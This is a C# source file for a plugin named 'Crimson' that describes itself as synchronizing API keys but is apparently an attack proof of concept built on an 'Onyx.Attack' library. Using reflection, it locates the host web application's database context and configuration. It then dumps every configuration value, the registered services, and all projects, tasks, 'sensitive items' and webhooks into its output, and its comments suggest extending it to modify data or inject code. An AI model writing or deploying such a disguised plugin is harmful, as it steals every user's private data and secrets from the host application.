using System.Diagnostics.CodeAnalysis;
using ProjectDashboard.Abstractions;
using Onyx.Attack;
using System.Text;


public class CrimsonPlugin : IPlugin
{
    public string Name => "Crimson";
    public string Description => "Synchronizes API keys across projects. ";

    public Task<PluginResult> ExecuteAsync(ProjectContext context, CancellationToken ct = default)
    {
        StringBuilder sb = new();
        // This is to demonstrate Onyx.Attack's capabilities when given code execution.
        // Let's first inspect the context
        var inspectionResult = Reflection.Inspect(context);
        sb.Append(inspectionResult.ToString());
        
        // Our goal is to first get all private data from all users 
        // Let's see if we can get the project list
        
        // We need to find the ApplicationDbContext
        // It won't be in the context's assembly, but we can still get it with a registry

        // The thing is, we have to find the instance of ApplicationDbContext being used
        // If you look at Program.cs in the ProjectDashboard.Web project, you can see that it's used by the app
        // This indicates that we can find the instance by looking through the ASP.NET assemblies
        var registry = new Registry();
        var filter = new Registry.Filter()
            .WithWhitelistedAssemblyContains("ProjectDashboard", "Microsoft.AspNetCore")
            .WithAllowOtherAssemblies(false)
            .WithAssemblyContainsAppliesToInstances()
            .WithAssemblyContainsAppliesToTypes();
        registry.Build(new Registry.AppDomainNode(AppDomain.CurrentDomain, 0), filter);
        
        // Let's see what we can find
        var builderType = Reflection.SearchForType("Microsoft.AspNetCore.Builder.WebApplicationBuilder");
        var appType = Reflection.SearchForType("Microsoft.AspNetCore.Builder.WebApplication");
        var dbContextType = Reflection.SearchForType("ProjectDashboard.Web.Data.ApplicationDbContext");
        dynamic? builder = registry.GetInstancesOfType(builderType, 0).FirstOrDefault()?.Instance;
        dynamic? app = registry.GetInstancesOfType(appType, 0).FirstOrDefault()?.Instance;
        dynamic? dbContext = registry.GetInstancesOfType(dbContextType, 0).FirstOrDefault()?.Instance;
        
        // These are all the things we are looking for
        string? contentRootPath = null;
        string? webRootPath = null;
        string? applicationName = null;
        string? environmentName = null;
        bool? IsDevelopment = null;
        bool? IsProduction = null;
        Dictionary<string, dynamic?> configuration = new();
        List<dynamic> services = new();
        IEnumerable<dynamic> projects = [];
        IEnumerable<dynamic> tasks = [];
        IEnumerable<dynamic> sensitiveItems = [];
        IEnumerable<dynamic> webhooks = [];
        
        if (builder != null)
        {
            dynamic? children = builder.Configuration.GetChildren();
            if (children is IEnumerable<dynamic> configChildren)
            {
                foreach(var x in configChildren.ToList()) configuration.Add(x.Key, x.Value);
            }
            // Let's get the environment data
            dynamic? env = builder.Environment;
            if (env != null)
            {
                contentRootPath = env.ContentRootPath;
                webRootPath = env.WebRootPath;
                applicationName = env.ApplicationName;
                environmentName = env.EnvironmentName;
                IsDevelopment = env.IsDevelopment();
                IsProduction = env.IsProduction();
            }
            // We can get services too
            dynamic? servicesCollection = builder.Services;
            services.AddRange(servicesCollection);
        }
        if (app != null)
        {
            // We can get the same data from the app
            dynamic? env = app.Environment;
            if (env != null)
            {
                contentRootPath ??= env.ContentRootPath;
                webRootPath ??= env.WebRootPath;
                applicationName ??= env.ApplicationName;
                environmentName ??= env.EnvironmentName;
                IsDevelopment ??= env.IsDevelopment();
                IsProduction ??= env.IsProduction();
            }
            // We can get services too
            dynamic? servicesCollection = app.Services;
            services.AddRange(servicesCollection);
        }

        if (dbContext != null)
        {
            // We should inspect the ApplicationDbContext
            var dbContextInspection = Reflection.Inspect(dbContext);
            sb.AppendLine("ApplicationDbContext Inspection:");
            sb.AppendLine(dbContextInspection.ToString());
            // We should get the Projects, Tasks, SensitiveItems, and Webhooks
            projects = dbContext.Projects;
            tasks = dbContext.Tasks;
            sensitiveItems = dbContext.SensitiveItems;
            webhooks = dbContext.Webhooks;
        }
        
        // Now we have all the data we need
        sb.AppendLine("Application Information:");
        sb.AppendLine($"Content Root Path: {contentRootPath}");
        sb.AppendLine($"Web Root Path: {webRootPath}");
        sb.AppendLine($"Application Name: {applicationName}");
        sb.AppendLine($"Environment Name: {environmentName}");
        sb.AppendLine($"Is Development: {IsDevelopment}");
        sb.AppendLine($"Is Production: {IsProduction}");
        sb.AppendLine("Configuration:");
        foreach (var kvp in configuration) 
        {
            sb.AppendLine($"  {kvp.Key}: {kvp.Value}");
        }
        sb.AppendLine("Services:");
        foreach (var service in services)
        {
            try
            {
                sb.AppendLine($"  {service.GetType().FullName} - {service}");
            }
            catch
            {
                sb.AppendLine($"  {service.GetType().FullName} - [Unable to display]");
            }
        }
        sb.AppendLine("Projects:");
        foreach (var project in projects)
        {
            var projectInspection = Reflection.Inspect(project);
            if (projectInspection is Reflection.InspectionResult res)
                sb.AppendLine(res.ToFormattedString(x => $"with value {x.Value}"));
        }
        sb.AppendLine("Tasks:");
        foreach (var task in tasks)
        {
            var taskInspection = Reflection.Inspect(task);
            if (taskInspection is Reflection.InspectionResult res)
                sb.AppendLine(res.ToFormattedString(x => $"with value {x.Value}"));
        }
        sb.AppendLine("Sensitive Items:");
        foreach (var item in sensitiveItems)
        {
            var itemInspection = Reflection.Inspect(item);
            if (itemInspection is Reflection.InspectionResult res)
                sb.AppendLine(res.ToFormattedString(x => $"with value {x.Value}"));
        }
        sb.AppendLine("Webhooks:");
        foreach (var webhook in webhooks)
        {
            var webhookInspection = Reflection.Inspect(webhook);
            if (webhookInspection is Reflection.InspectionResult res)
                sb.AppendLine(res.ToFormattedString(x => $"with value {x.Value}"));
        }
        
        // Now we can return the result
        // This is a simple plugin that demonstrates how to use Onyx.Attack to inspect and manipulate the application
        // It can be expanded to attack the application in various ways, such as modifying data, injecting code, or exfiltrating sensitive information.
        // For example, we could attempt to modify account data or change page content.
        // This is a proof of concept for how Onyx.Attack can be used to interact with a web application in a plugin format.

        return Task.FromResult(new PluginResult
        {
            Output = sb.ToString(),
            Success = true,
        });
    }
}
